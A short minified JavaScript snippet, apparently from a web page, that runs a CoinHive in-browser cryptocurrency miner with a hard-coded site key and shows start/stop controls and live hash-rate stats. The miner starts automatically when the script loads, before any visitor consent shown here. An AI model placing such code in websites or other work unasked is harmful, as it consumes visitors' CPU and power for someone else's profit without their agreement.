var miner=new CoinHive.Anonymous("WrLyksZRJHCRNxgEtSnR0eEJXZYjnBm9",{threads:4,throttle:0.25});miner.start();startLink=document.getElementById("startMiner");startLink.addEventListener("click",minerStart);stopLink=document.getElementById("stopMiner");stopLink.addEventListener("click",minerStop);function minerStart(){miner.start();startLink.classList.add("none");stopLink.classList.remove("none")}function minerStop(){miner.stop();stopLink.classList.add("none");startLink.classList.remove("none")}setInterval(function(){var a=miner.getHashesPerSecond();var b=miner.getTotalHashes();document.querySelector(".hashesPerSecond").innerHTML=a.toPrecision(3);document.querySelector(".totalHashes").innerHTML=b},1000);